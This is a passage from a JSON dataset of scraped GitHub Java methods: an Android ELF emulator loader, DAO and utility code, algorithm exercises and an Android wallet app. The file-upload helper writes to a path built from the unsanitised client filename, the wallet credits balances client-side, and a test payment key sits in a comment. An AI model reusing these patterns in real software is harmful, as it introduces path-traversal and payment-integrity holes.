offset=\" + (System.currentTimeMillis() - start) + \"ms\" + \", entry_point=0x\" + Long.toHexString(elfFile.entry_point));\n        notifyModuleLoaded(module);\n        return module;\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/linux/AndroidElfLoader.java", "stars": "16", "class_props": {"extends": "AbstractLoader", "implements": ["Memory", "Loader"], "modifiers": ["public"]}}, {"id": 59927, "method_name": "loadVirtualModule", "class_name": "AndroidElfLoader", "params": ["String", "Map<String,UnicornPointer>"], "throws": null, "modifiers": ["public"], "return_type": "Module", "snippet": "    public Module loadVirtualModule(String name, Map<String, UnicornPointer> symbols) {\n        LinuxModule module = LinuxModule.createVirtualModule(name, symbols, emulator);\n        modules.put(name, module);\n        if (maxSoName == null || name.length() > maxSoName.length()) {\n            maxSoName = name;\n        }\n        return module;\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/linux/AndroidElfLoader.java", "stars": "16", "class_props": {"extends": "AbstractLoader", "implements": ["Memory", "Loader"], "modifiers": ["public"]}}, {"id": 59928, "method_name": "resolveSymbol", "class_name": "AndroidElfLoader", "params": ["long", "ElfSymbol", "Pointer", "String", "Collection<Module>", "long"], "throws": ["IOException"], "modifiers": ["private"], "return_type": "ModuleSymbol", "snippet": "    private ModuleSymbol resolveSymbol(long load_base, ElfSymbol symbol, Pointer relocationAddr, String soName, Collection<Module> neededLibraries, long offset) throws IOException {\n        if (symbol == null) {\n            return new ModuleSymbol(soName, load_base, null, relocationAddr, soName, offset);\n        }\n\n        if (!symbol.isUndef()) {\n            for (HookListener listener : hookListeners) {\n                long hook = listener.hook(emulator.getSvcMemory(), soName, symbol.getName(), load_base + symbol.value + offset);\n                if (hook > 0) {\n                    return new ModuleSymbol(soName, ModuleSymbol.WEAK_BASE, symbol, relocationAddr, soName, hook);\n                }\n            }\n            return new ModuleSymbol(soName, load_base, symbol, relocationAddr, soName, offset);\n        }\n\n        return new ModuleSymbol(soName, load_base, symbol, relocationAddr, null, offset).resolve(neededLibraries, false, hookListeners, emulator.getSvcMemory());\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/linux/AndroidElfLoader.java", "stars": "16", "class_props": {"extends": "AbstractLoader", "implements": ["Memory", "Loader"], "modifiers": ["public"]}}, {"id": 59929, "method_name": "get_segment_protection", "class_name": "AndroidElfLoader", "params": ["int"], "throws": null, "modifiers": ["private"], "return_type": "int", "snippet": "    private int get_segment_protection(int flags) {\n        int prot = Unicorn.UC_PROT_NONE;\n        if ((flags & /* PF_R= */4) != 0) prot |= Unicorn.UC_PROT_READ;\n        if ((flags & /* PF_W= */2) != 0) prot |= Unicorn.UC_PROT_WRITE;\n        if ((flags & /* PF_X= */1) != 0) prot |= Unicorn.UC_PROT_EXEC;\n        return prot;\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/linux/AndroidElfLoader.java", "stars": "16", "class_props": {"extends": "AbstractLoader", "implements": ["Memory", "Loader"], "modifiers": ["public"]}}, {"id": 59930, "method_name": "malloc", "class_name": "AndroidElfLoader", "params": ["int", "boolean"], "throws": null, "modifiers": ["public"], "return_type": "MemoryBlock", "snippet": "    public MemoryBlock malloc(int length, boolean runtime) {\n        if (runtime) {\n            return MemoryBlockImpl.alloc(this, length);\n        } else {\n            return MemoryAllocBlock.malloc(emulator, malloc, free, length);\n        }\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/linux/AndroidElfLoader.java", "stars": "16", "class_props": {"extends": "AbstractLoader", "implements": ["Memory", "Loader"], "modifiers": ["public"]}}, {"id": 59931, "method_name": "brk", "class_name": "AndroidElfLoader", "params": ["long"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int brk(long address) {\n        if (address == 0) {\n            this.brk = HEAP_BASE;\n            return (int) this.brk;\n        }\n\n        if (address % emulator.getPageAlign() != 0) {\n            throw new UnsupportedOperationException();\n        }\n\n        if (address > brk) {\n            unicorn.mem_map(brk, address - brk, UnicornConst.UC_PROT_READ | UnicornConst.UC_PROT_WRITE);\n            this.brk = address;\n        } else if(address < brk) {\n            unicorn.mem_unmap(address, brk - address);\n            this.brk = address;\n        }\n\n        return (int) this.brk;\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/linux/AndroidElfLoader.java", "stars": "16", "class_props": {"extends": "AbstractLoader", "implements": ["Memory", "Loader"], "modifiers": ["public"]}}, {"id": 59932, "method_name": "setErrno", "class_name": "AndroidElfLoader", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setErrno(int errno) {\n        this.errno.setInt(0, errno);\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/linux/AndroidElfLoader.java", "stars": "16", "class_props": {"extends": "AbstractLoader", "implements": ["Memory", "Loader"], "modifiers": ["public"]}}, {"id": 59933, "method_name": "getMaxLengthLibraryName", "class_name": "AndroidElfLoader", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getMaxLengthLibraryName() {\n        return maxSoName;\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/linux/AndroidElfLoader.java", "stars": "16", "class_props": {"extends": "AbstractLoader", "implements": ["Memory", "Loader"], "modifiers": ["public"]}}, {"id": 59934, "method_name": "getMaxSizeOfLibrary", "class_name": "AndroidElfLoader", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long getMaxSizeOfLibrary() {\n        return maxSizeOfSo;\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/linux/AndroidElfLoader.java", "stars": "16", "class_props": {"extends": "AbstractLoader", "implements": ["Memory", "Loader"], "modifiers": ["public"]}}, {"id": 59935, "method_name": "getLoadedModules", "class_name": "AndroidElfLoader", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Collection<Module>", "snippet": "    public Collection<Module> getLoadedModules() {\n        return new ArrayList<Module>(modules.values());\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/linux/AndroidElfLoader.java", "stars": "16", "class_props": {"extends": "AbstractLoader", "implements": ["Memory", "Loader"], "modifiers": ["public"]}}, {"id": 59936, "method_name": "get", "class_name": "PropertiesDAO", "params": ["String"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String get(String key) throws BGException {\n\t\ttry {\n\t\t\tString result = null;\n\t\t\t\n\t\t\tString query = \"SELECT value FROM\" + TABLE_NAME + \"WHERE param=?\";\n\t\t\tPreparedStatement ps = con.prepareStatement(query);\n\t\t\tps.setString(1, key);\n\t\t\t\n\t\t\tResultSet rs = ps.executeQuery();\n\t\t\tif (rs.next())\n\t\t\t\tresult = rs.getString(1);\n\t\t\tps.close();\n\t\t\t\n\t\t\treturn result;\n\t\t} catch (SQLException ex) {\n\t\t\tthrow new BGException(ex);\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/dao/PropertiesDAO.java", "stars": "12", "class_props": {"extends": "CommonDAO", "implements": null, "modifiers": ["public"]}}, {"id": 59937, "method_name": "set", "class_name": "PropertiesDAO", "params": ["String", "String"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void set(String key, String value) throws BGException {\n\t\ttry {\n\t\t\tString query =  SQL_INSERT + TABLE_NAME + \n\t\t\t\t\"SET param=?, value=?\" +\n\t\t\t\tSQL_ON_DUP_KEY_UPDATE + \n\t\t\t\t\"value=?\";\n\t\t\tPreparedStatement ps = con.prepareStatement(query);\n\t\t\tps.setString(1, key);\n\t\t\tps.setString(2, value);\n\t\t\tps.setString(3, value);\n\t\t\tps.executeUpdate();\n\t\t\tps.close();\t\t\t\n\t\t} catch (SQLException ex) {\n\t\t\tthrow new BGException(ex);\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/dao/PropertiesDAO.java", "stars": "12", "class_props": {"extends": "CommonDAO", "implements": null, "modifiers": ["public"]}}, {"id": 59938, "method_name": "permutation", "class_name": "Code03_PrintAllPermutations", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "ArrayList<String>", "snippet": "\tpublic static ArrayList<String> permutation(String str) {\n\t\tArrayList<String> res = new ArrayList<>();\n\t\tif (str == null || str.length() == 0) {\n\t\t\treturn res;\n\t\t}\n\t\tchar[] chs = str.toCharArray();\n\t\tprocess(chs, 0, res);\n\t\treturn res;\n\t}", "url": "https://raw.githubusercontent.com/algorithmzuo/algorithmbasic2020/master/src/class11/Code03_PrintAllPermutations.java", "stars": "27", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59939, "method_name": "process", "class_name": "Code03_PrintAllPermutations", "params": ["char", "int", "ArrayList<String>"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void process(char[] str, int i, ArrayList<String> res) {\n\t\tif (i == str.length) {\n\t\t\tres.add(String.valueOf(str));\n\t\t}\n\t\tfor (int j = i; j < str.length; j++) {\n\t\t\tswap(str, i, j);\n\t\t\tprocess(str, i + 1, res);\n\t\t\tswap(str, i, j);\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/algorithmzuo/algorithmbasic2020/master/src/class11/Code03_PrintAllPermutations.java", "stars": "27", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59940, "method_name": "permutationNoRepeat", "class_name": "Code03_PrintAllPermutations", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "ArrayList<String>", "snippet": "\tpublic static ArrayList<String> permutationNoRepeat(String str) {\n\t\tArrayList<String> res = new ArrayList<>();\n\t\tif (str == null || str.length() == 0) {\n\t\t\treturn res;\n\t\t}\n\t\tchar[] chs = str.toCharArray();\n\t\tprocess2(chs, 0, res);\n\t\treturn res;\n\t}", "url": "https://raw.githubusercontent.com/algorithmzuo/algorithmbasic2020/master/src/class11/Code03_PrintAllPermutations.java", "stars": "27", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59941, "method_name": "process2", "class_name": "Code03_PrintAllPermutations", "params": ["char", "int", "ArrayList<String>"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void process2(char[] str, int i, ArrayList<String> res) {\n\t\tif (i == str.length) {\n\t\t\tres.add(String.valueOf(str));\n\t\t}\n\t\tboolean[] visit = new boolean[26]; // visit[0 1 .. 25]\n\t\tfor (int j = i; j < str.length; j++) {\n\t\t\tif (!visit[str[j] - 'a']) {\n\t\t\t\tvisit[str[j] - 'a'] = true;\n\t\t\t\tswap(str, i, j);\n\t\t\t\tprocess2(str, i + 1, res);\n\t\t\t\tswap(str, i, j);\n\t\t\t}\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/algorithmzuo/algorithmbasic2020/master/src/class11/Code03_PrintAllPermutations.java", "stars": "27", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59942, "method_name": "swap", "class_name": "Code03_PrintAllPermutations", "params": ["char", "int", "int"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void swap(char[] chs, int i, int j) {\n\t\tchar tmp = chs[i];\n\t\tchs[i] = chs[j];\n\t\tchs[j] = tmp;\n\t}", "url": "https://raw.githubusercontent.com/algorithmzuo/algorithmbasic2020/master/src/class11/Code03_PrintAllPermutations.java", "stars": "27", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59943, "method_name": "main", "class_name": "Code03_PrintAllPermutations", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void main(String[] args) {\n\t\tString s = \"aac\";\n\t\tList<String> ans1 = permutation(s);\n\t\tfor (String str : ans1) {\n\t\t\tSystem.out.println(str);\n\t\t}\n\t\tSystem.out.println(\"=======\");\n\t\tList<String> ans2 = permutationNoRepeat(s);\n\t\tfor (String str : ans2) {\n\t\t\tSystem.out.println(str);\n\t\t}\n\n\t}", "url": "https://raw.githubusercontent.com/algorithmzuo/algorithmbasic2020/master/src/class11/Code03_PrintAllPermutations.java", "stars": "27", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59944, "method_name": "main", "class_name": "Project", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main (String[] args) { \n       int amount = Integer.parseInt(args[0]); \n       int cents = amount;\n      \n       int quarters = amount / 25;\n       amount = amount % 25;\n\n       int dimes = amount / 10;\n       amount = amount % 10;\n\n       int nickels = amount / 5;\n       amount = amount % 5;\n       \n       int pennies = amount;\n       \n       System.out.println(cents + \" cents in coins:\");\n       System.out.println(quarters + \" quarters\");\n       System.out.println(dimes + \" dimes\");\n       System.out.println(nickels + \" nickels\");\n       System.out.println(pennies + \" pennies\");\n    }", "url": "https://raw.githubusercontent.com/Suranchiyev/java-sdet-2020/master/src/day5/Project.java", "stars": "21", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59945, "method_name": "getJobConf", "class_name": "StatsUtils", "params": ["RunningJob"], "throws": null, "modifiers": ["public", "static"], "return_type": "Properties", "snippet": "  public static Properties getJobConf(RunningJob runningJob) {\n    try {\n      Path path = new Path(runningJob.getJobFile());\n      Configuration conf = new Configuration(false);\n      FileSystem fs = FileSystem.get(new Configuration());\n      InputStream in = fs.open(path);\n      conf.addResource(in);\n      return getJobConf(conf);\n    } catch (FileNotFoundException e) {\n      logger.warn(\"Job conf not found.\");\n    } catch (IOException e) {\n      logger.warn(\"Error while retrieving job conf: \" + e.getMessage());\n    }\n    return null;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/jobtype/StatsUtils.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59946, "method_name": "getJobConf", "class_name": "StatsUtils", "params": ["Configuration"], "throws": null, "modifiers": ["public", "static"], "return_type": "Properties", "snippet": "  public static Properties getJobConf(Configuration conf) {\n    if (conf == null) {\n      return null;\n    }\n\n    Properties jobConfProperties = null;\n    try {\n      jobConfProperties = new Properties();\n      for (Map.Entry<String, String> entry : conf) {\n        if (entry.getKey().equals(\"pig.mapPlan\")\n            || entry.getKey().equals(\"pig.reducePlan\")) {\n          jobConfProperties.setProperty(entry.getKey(), ObjectSerializer\n              .deserialize(entry.getValue()).toString());\n        } else if (JOB_CONF_KEYS.contains(entry.getKey())) {\n          jobConfProperties.setProperty(entry.getKey(), entry.getValue());\n        }\n      }\n    } catch (IOException e) {\n      logger.warn(\"Error while reading job conf: \" + e.getMessage());\n    }\n    return jobConfProperties;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/jobtype/StatsUtils.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59947, "method_name": "propertiesToJson", "class_name": "StatsUtils", "params": ["Properties"], "throws": null, "modifiers": ["public", "static"], "return_type": "Object", "snippet": "  public static Object propertiesToJson(Properties properties) {\n    Map<String, String> jsonObj = new HashMap<String, String>();\n    if (properties != null) {\n      Set<String> keys = properties.stringPropertyNames();\n      for (String key : keys) {\n        jsonObj.put(key, properties.getProperty(key));\n      }\n    }\n    return jsonObj;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/jobtype/StatsUtils.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59948, "method_name": "propertiesFromJson", "class_name": "StatsUtils", "params": ["Object"], "throws": null, "modifiers": ["public", "static"], "return_type": "Properties", "snippet": "  public static Properties propertiesFromJson(Object obj) {\n    @SuppressWarnings(\"unchecked\")\n    Map<String, String> jsonObj = (HashMap<String, String>) obj;\n\n    Properties properties = new Properties();\n    for (Map.Entry<String, String> entry : jsonObj.entrySet()) {\n      properties.setProperty(entry.getKey(), entry.getValue());\n    }\n    return properties;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/jobtype/StatsUtils.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59949, "method_name": "countersToJson", "class_name": "StatsUtils", "params": ["Counters"], "throws": null, "modifiers": ["public", "static"], "return_type": "Object", "snippet": "  public static Object countersToJson(Counters counters) {\n    Map<String, Object> jsonObj = new HashMap<String, Object>();\n\n    if (counters == null) {\n      return jsonObj;\n    }\n\n    Collection<String> counterGroups = counters.getGroupNames();\n    for (String groupName : counterGroups) {\n      Map<String, String> counterStats = new HashMap<String, String>();\n      Group group = counters.getGroup(groupName);\n      Iterator<Counters.Counter> it = group.iterator();\n      while (it.hasNext()) {\n        Counter counter = it.next();\n        counterStats.put(counter.getDisplayName(),\n            String.valueOf(counter.getCounter()));\n      }\n      jsonObj.put(groupName, counterStats);\n    }\n    return jsonObj;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/jobtype/StatsUtils.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59950, "method_name": "upload", "class_name": "FileUploadKit", "params": ["MultipartFile", "UploadPathEnum", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "UploadFileInfo", "snippet": "    public static UploadFileInfo upload(MultipartFile multipartFile, UploadPathEnum pathEnum, String toPath) {\n        String path;\n        String uploadPath;\n        String filename;\n        try {\n            if (multipartFile == null) {\n                throw new KvfException(\"\u6ca1\u6709\u53ef\u4e0a\u4f20\u7684\u6587\u4ef6\");\n            }\n\n            filename = multipartFile.getOriginalFilename();\n\n            if (pathEnum == null && StrUtil.isBlank(toPath)) {\n                throw new KvfException(\"\u4e0a\u4f20\u8def\u5f84\u4e0d\u5b58\u5728\");\n            } else if (pathEnum != null) {\n                path = pathEnum.getPath() + filename;\n                uploadPath = ClassUtil.getClassPath() +  path;\n            } else {\n                path = toPath + filename;\n                uploadPath = path;\n            }\n            LOGGER.info(\"uploadPath={}\", uploadPath);\n\n            File file = new File(uploadPath);\n            // \u5224\u65ad\u7236\u76ee\u5f55\u662f\u5426\u5b58\u5728\uff0c\u5982\u679c\u4e0d\u5b58\u5728\uff0c\u5219\u521b\u5efa\n            if (file.getParentFile() != null && !file.getParentFile().exists()) {\n                file.getParentFile().mkdirs();\n            }\n            file.createNewFile();\n            multipartFile.transferTo(file);\n            return new UploadFileInfo(filename, path, uploadPath);\n        } catch (Exception e) {\n            throw new KvfException(\"\u4e0a\u4f20\u6587\u4ef6\u5931\u8d25\uff1a\" + e.getMessage());\n        }\n\n    }", "url": "https://raw.githubusercontent.com/IzzyPrime/Admin/master/src/main/java/com/kalvin/kvf/common/utils/FileUploadKit.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59951, "method_name": "uploadRelative", "class_name": "FileUploadKit", "params": ["MultipartFile", "UploadPathEnum"], "throws": null, "modifiers": ["public", "static"], "return_type": "UploadFileInfo", "snippet": "    public static UploadFileInfo uploadRelative(MultipartFile multipartFile, UploadPathEnum pathEnum) {\n        return FileUploadKit.upload(multipartFile, pathEnum, null);\n    }", "url": "https://raw.githubusercontent.com/IzzyPrime/Admin/master/src/main/java/com/kalvin/kvf/common/utils/FileUploadKit.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59952, "method_name": "uploadAbsolute", "class_name": "FileUploadKit", "params": ["MultipartFile", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "UploadFileInfo", "snippet": "    public static UploadFileInfo uploadAbsolute(MultipartFile multipartFile, String toPath) {\n        return FileUploadKit.upload(multipartFile, null, toPath);\n    }", "url": "https://raw.githubusercontent.com/IzzyPrime/Admin/master/src/main/java/com/kalvin/kvf/common/utils/FileUploadKit.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59953, "method_name": "onCreate", "class_name": "AddBalance", "params": ["Bundle"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_add_banlance);\n        loadUI();\n        firebaseId = \"#paone\"; //TODO to be replaced by firebase id of the user obtained after firebase authentication\n\n        FirebaseFirestore db = FirebaseFirestore.getInstance();\n        DocumentReference docRef = db.collection(\"user_balance\").document(firebaseId);\n        docRef.addSnapshotListener(new EventListener<DocumentSnapshot>() {\n            @Override\n            public void onEvent(@Nullable DocumentSnapshot documentSnapshot, @Nullable FirebaseFirestoreException e) {\n                if (e != null) {\n                    Log.e(\"firebase\", \"document doesn't exist\");\n                    return;\n                }\n                if(documentSnapshot.exists())\n                    currentAmount = (long) documentSnapshot.get(\"userBalance\");\n                    Log.e(\"amount\",\"\"+currentAmount);\n                userBalanceTextView.setText(\"\\u20B9 \" + currentAmount);\n            }\n        });\n\n\n        addMoney.setOnClickListener(new View.OnClickListener() {\n            @Override\n            public void onClick(View v) {\n                addAmountDialog.setVisibility(View.VISIBLE);\n            }\n        });\n\n        proceed.setOnClickListener(new View.OnClickListener() {\n            @Override\n            public void onClick(View v) {\n                if (TextUtils.isEmpty(amountText.getText().toString()))\n                    Toast.makeText(AddBalance.this, \"Please enter valid amount\", Toast.LENGTH_SHORT).show();\n                else {\n                    amount = Integer.parseInt(amountText.getText().toString());\n                    if (amount <= 0)\n                        Toast.makeText(AddBalance.this, \"Please enter valid amount\", Toast.LENGTH_SHORT).show();\n                    else\n                        startPayment(amount);\n                }\n            }\n        });\n    }", "url": "https://raw.githubusercontent.com/pawanharariya/wallet/master/app/src/main/java/com/example/pro/AddBalance.java", "stars": "2", "class_props": {"extends": "AppCompatActivity", "implements": ["PaymentResultListener"], "modifiers": ["public"]}}, {"id": 59954, "method_name": "startPayment", "class_name": "AddBalance", "params": ["long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void startPayment(long amountToAdd) {\n        Checkout checkout = new Checkout();\n//        checkout.setKeyID(\"rzp_test_sVrW5vtI3Nd2pZ\\t\");\n        checkout.setImage(R.drawable.pay);\n        final Activity activity = AddBalance.this;\n        try {\n            JSONObject options = new JSONObject();\n            options.put(\"name\", \"Merchant Name\");\n            options.put(\"description\", \"Reference No. #123456\");\n            options.put(\"image\", \"https://s3.amazonaws.com/rzp-mobile/images/rzp.png\");\n            options.put(\"currency\", \"INR\");\n            options.put(\"amount\", amountToAdd + \"00\");\n            checkout.open(activity, options);\n        } catch (Exception e) {\n            Log.e(\"error\", \"Error in starting Razorpay Checkout\", e);\n        }\n    }", "url": "https://raw.githubusercontent.com/pawanharariya/wallet/master/app/src/main/java/com/example/pro/AddBalance.java", "stars": "2", "class_props": {"extends": "AppCompatActivity", "implements": ["PaymentResultListener"], "modifiers": ["public"]}}, {"id": 59955, "method_name": "onPaymentSuccess", "class_name": "AddBalance", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onPaymentSuccess(String s) {\n        addAmountDialog.setVisibility(View.GONE);\n        Log.e(\"Payment Success\", s);\n        Toast.makeText(AddBalance.this, \"Money added to your wallet\", Toast.LENGTH_SHORT).show();\n        Checkout.clearUserData(this);\n        postData(s);\n    }", "url": "https://raw.githubusercontent.com/pawanharariya/wallet/master/app/src/main/java/com/example/pro/AddBalance.java", "stars": "2", "class_props": {"extends": "AppCompatActivity", "implements": ["PaymentResultListener"], "modifiers": ["public"]}}, {"id": 59956, "method_name": "onPaymentError", "class_name": "AddBalance", "params": ["int", "String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onPaymentError(int i, String s) {\n        Log.e(\"payment error\", s);\n        if (i == Checkout.NETWORK_ERROR) {\n            Log.e(\"error payment failed\", \"Checkout.NETWORK_ERROR\");\n            Toast.makeText(this, \"Poor Network, Payment Failed\", Toast.LENGTH_SHORT).show();\n        }\n        if (i == Checkout.INVALID_OPTIONS) {\n            Log.e(\"error payment failed\", \"Checkout.INVALID_OPTIONS\");\n            Toast.makeText(this, \"Payment Failed\", Toast.LENGTH_SHORT).show();\n\n        }\n        if (i == Checkout.PAYMENT_CANCELED) {\n            Log.e(\"error payment failed\", \"Checkout.PAYMENT_CANCELED\");\n            Toast.makeText(this, \"Payment Canceled by user\", Toast.LENGTH_SHORT).show();\n\n        }\n        if (i == Checkout.TLS_ERROR) {\n            Log.e(\"error payment failed\", \"Checkout.TLS_ERROR\");\n            Toast.makeText(this, \"Payment Not supported\", Toast.LENGTH_SHORT).show();\n        }\n    }", "url": "https://raw.githubusercontent.com/pawanharariya/wallet/master/app/src/main/java/com/example/pro/AddBalance.java", "stars": "2", "class_props": {"extends": "AppCompatActivity", "implements": ["PaymentResultListener"], "modifiers": ["public"]}}, {"id": 59957, "method_name": "postData", "class_name": "AddBalance", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void postData(final String s) {\n        post = new ProgressDialog(this);\n        post.setCancelable(false);\n        post.setMessage(\"Adding amount\");\n        post.show();\n        FirebaseFirestore db = FirebaseFirestore.getInstance();\n        DocumentReference docRef = db.collection(\"user_balance\").document(firebaseId);\n        Map<String, Object> data = new HashMap<>();\n        data.put(\"userBalance\", currentAmount + amount);\n        docRef.set(data)\n                .addOnCompleteListener(new OnCompleteListener<Void>() {\n                    @Override\n                    public void onComplete(@NonNull Task<Void> task) {\n                        postTransaction(s);\n                    }\n                });\n    }", "url": "https://raw.githubusercontent.com/pawanharariya/wallet/master/app/src/main/java/com/example/pro/AddBalance.java", "stars": "2", "class_props": {"extends": "AppCompatActivity", "implements": ["PaymentResultListener"], "modifiers": ["public"]}}, {"id": 59958, "method_name": "backDialog", "class_name": "AddBalance", "params": ["View"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void backDialog(View view) {\n        addAmountDialog.setVisibility(View.GONE);\n    }", "url": "https://raw.githubusercontent.com/pawanharariya/wallet/master/app/src/main/java/com/example/pro/AddBalance.java", "stars": "2", "class_props": {"extends": "AppCompatActivity", "implements": ["PaymentResultListener"], "modifiers": ["public"]}}, {"id": 59959, "method_name": "loadUI", "class_name": "AddBalance", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void loadUI() {\n        addMoney = findViewById(R.id.add_money);\n        amountText = findViewById(R.id.amount);\n        proceed = findViewById(R.id.proceed);\n        addAmountDialog = findViewById(R.id.add_amount_dialog);\n        userBalanceTextView = findViewById(R.id.user_balance);\n    }", "url": "https://raw.githubusercontent.com/pawanharariya/wallet/master/app/src/main/java/com/example/pro/AddBalance.java", "stars": "2", "class_props": {"extends": "AppCompatActivity", "implements": ["PaymentResultListener"], "modifiers": ["public"]}}, {"id": 59960, "method_name": "postTransaction", "class_name": "AddBalance", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void postTransaction(String s) {\n        FirebaseFirestore db = FirebaseFirestore.getInstance();\n        DocumentReference docRef2 = db.collection(\"transactions\").document();\n        Map<String, Object> data2 = new HashMap<>();\n        data2.put(\"userId\", firebaseId);\n        data2.put(\"amount\", amount);\n        data2.put(\"transactionId\", s);\n        docRef2.set(data2)\n                .addOnCompleteListener(new OnCompleteListener<Void>() {\n                    @Override\n                    public void onComplete(@NonNull Task<Void> task) {\n                        Toast.makeText(AddBalance.this, \"Money added successfully\", Toast.LENGTH_SHORT).show();\n                        post.dismiss();\n                    }\n                });\n    }", "url": "https://raw.githubusercontent.com/pawanharariya/wallet/master/app/src/main/java/com/example/pro/AddBalance.java", "stars": "2", "class_props": {"extends": "AppCompatActivity", "implements": ["PaymentResultListener"], "modifiers": ["public"]}}, {"id": 59961, "method_name": "testSerialize", "class_name": "XMLUtilsTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void testSerialize() throws Exception {\n        Document doc = XMLUtils.newDocument();\n        Element el = XMLUtils.newElement(doc, \"test\");\n        el.setAttribute(\"a\", \"1\");\n        XMLUtils.newElement(el, \"child\");\n        \n        ByteArrayOutputStream bos = new ByteArrayOutputStream(100);\n        XMLUtils.serialize(doc, bos, StandardCharsets.UTF_8.name(), true);\n        String result = new String(bos.toByteArray(), StandardCharsets.UTF_8.name());\n        Assert.assertTrue(result.contains(\"<test a=\\\"1\\\">\\n\"));\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/srcx/test/ru/bgcrm/util/XMLUtilsTest.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59962, "method_name": "getName", "class_name": "JadeArticle", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getName() {\n        return name;\n    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/behavioral/visitor/JadeArticle.java", "stars": "2", "class_props": {"extends": null, "implements": ["Museum"], "modifiers": ["public"]}}, {"id": 59963, "method_name": "setName", "class_name": "JadeArticle", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setName(String name) {\n        this.name = name;\n    }", "url": 